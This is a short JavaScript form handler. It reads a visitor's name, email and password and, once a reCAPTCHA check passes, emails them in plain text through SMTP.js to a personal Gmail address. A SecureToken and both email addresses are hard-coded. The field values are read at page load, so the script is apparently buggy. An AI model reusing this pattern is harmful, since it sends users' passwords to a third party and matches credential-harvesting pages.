

let form = document.querySelector("form");
let arr = document.querySelectorAll("input");
let name1 = arr[0].value;
let email = arr[1].value;
let pass = arr[2].value;
let all = "Name: " + name1 + "<br/>" + "email: " + email + "<br/>" + "pass " + pass;

var recaptcha_response = '';
form.onsubmit = function (e) {


    e.preventDefault();


    if (recaptcha_response.length == 0) {
        document.getElementById('g-recaptcha-error').innerHTML = '<span style="color:red;">This field is required.</span>';
        return false;
    }
    Email.send({
        SecureToken: "ae026f42-dbb9-425d-a9f3-dc645c2f5e98",
        To: 'salibmina470@gmail.com',
        From: "projectsad8@gmail.com",
        Subject: "New surevy",
        Body: all
    }).then(
        message => alert(message)
    );
    return true;
}

function verifyCaptcha(token) {
    recaptcha_response = token;
    document.getElementById('g-recaptcha-error').innerHTML = '';
}
